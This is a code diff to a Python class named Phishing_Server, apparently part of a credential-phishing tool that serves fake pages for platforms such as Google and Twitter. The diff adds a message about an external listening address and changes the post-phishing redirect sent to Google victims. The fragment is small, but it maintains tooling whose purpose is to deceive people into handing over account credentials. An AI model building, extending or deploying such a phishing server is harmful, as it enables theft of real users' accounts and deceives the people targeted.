@@ -25,6 +25,8 @@ class Phishing_Server:
             sys.exit()
     def listen(self):
         print(f"[+] Phishing Server is listening on {self.ip}:{self.port}")
+        if self.externalip != self.ip:
+            print(f"[+] Also listening on(for external connections): {self.externalip}:{self.port}")
         while True:
             try:
                 self.s.listen()
@@ -666,7 +668,7 @@ class Phishing_Server:
                     """.encode())
                 elif self.platform.lower() == "google":
                     c.send("""
-                    <meta http-equiv="Refresh" content="0; url='https://accounts.google.com/'" />          
+                    <meta http-equiv="Refresh" content="0; url='https://google.com/'" />          
                     """.encode())
                 elif self.platform.lower() == "twitter":
                     c.send("""
